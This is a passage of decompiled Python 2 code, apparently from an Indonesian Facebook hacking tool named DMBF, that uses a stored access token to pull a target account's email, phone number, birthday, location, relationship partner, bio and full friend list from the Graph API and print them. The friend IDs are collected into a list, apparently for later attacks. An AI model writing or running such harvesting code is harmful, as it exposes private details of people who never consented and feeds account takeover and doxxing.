        otww = requests.get('https://graph.facebook.com/%s?access_token=%s' % (ajg, __cindy__))
        x = json.loads(otww.text)
        nama = a['name']
        namade = a['first_name']
        namabe = x['last_name']
        idfb = x['id']
        user = x['username']
        ttll = x['birthday']
        tzim = x['timezone']
        stas = x['relationship_status']
        dgn = 'dengan %s' % x['significant_other']['name']
        tigl = x['location']['name']
        dari = x['hometown']['name']
        lins = x['link']
        uptd = x['updated_time']
        nmrr = x['mobile_phone']
        emai = x['email']
        bioo = x['about']
        gndr = x['gender']
    except (KeyError, IOError):
        nama = M + '\xe2\x80\x94' + c
        namade = M + '\xe2\x80\x94' + c
        namabe = M + '\xe2\x80\x94' + c
        idfb = M + '\xe2\x80\x94' + c
        user = M + '\xe2\x80\x94' + c
        ttll = M + '\xe2\x80\x94' + c
        tzim = M + '\xe2\x80\x94' + c
        stas = M + '\xe2\x80\x94' + c
        dgn = M + '\xe2\x80\x94' + c
        tigl = M + '\xe2\x80\x94' + c
        dari = M + '\xe2\x80\x94' + c
        lins = M + '\xe2\x80\x94' + c
        uptd = M + '\xe2\x80\x94' + c
        nmrr = M + '\xe2\x80\x94' + c
        emai = M + '\xe2\x80\x94' + c
        bioo = M + '\xe2\x80\x94' + c
        gndr = M + '\xe2\x80\x94' + c

    try:
        r = requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (ajg, __cindy__))
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    except:
        pass

    try:
        r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s' % (ajg, __cindy__))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
        pengikut = '%s-%s' % (M, N)
    except:
        pass

    print '\n  ' + p + 'Informasih Akun Facebook'
    time.sleep(0.03)
    print c + ' [' + m + '!' + c + ']' + p + 'Nama Lengkap     : %s' % nama
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Nama Depan       : ' + namade + ''
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Nama Belakang    : %s' % namabe
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'ID Facebook      : %s' % idfb
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Username Facebook: %s' % user
    time.sleep(0.03)
    print '\n  ' + b + '* ' + p + 'Data-Data Akun Facebook ' + b + '*\n'
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Gmail Facebook   : %s' % emai
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Nomor Telepons   : %s' % nmrr
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Tanggal Lahir    : %s' % ttll
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Jenis Kelamin    : %s' % gndr
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Jumlah Teman     : %s' % str(len(id))
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Jumlah Followers : %s' % pengikut
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Link Facebook    : %s' % lins
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Status Hubungan  : %s %s' % (stas, dgn)
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Tentang Status   : %s' % bioo
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Kota Asal        : %s' % dari
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Tinggal          : %s' % tigl
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Zona Waktu       : %s' % tzim
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + 'Terahir DiUpdate : %s' % uptd
    time.sleep(0.03)
    print ' [' + m + '!' + c + ']' + p + '------------------------------------------------' + b + '\xe2\x9f\xa9\xe2\x9f\xa9'
    time.sleep(3)
    print p + 'Author : Muhammad Dicky Wahyudi'
    print p + 'Script : Muhammad Dicky Wahyudi '
    time.sleep(2)
    print 'Sukses Untuk Ngecek Data Data Akun Tersebut:)'
    raw_input('\n  [ %sKEMBALI%s ] ' % (O, N))
    menu()


if __name__ == '__main__':
    menu()
# okay decompiling /sdcard/DMBF.pyc
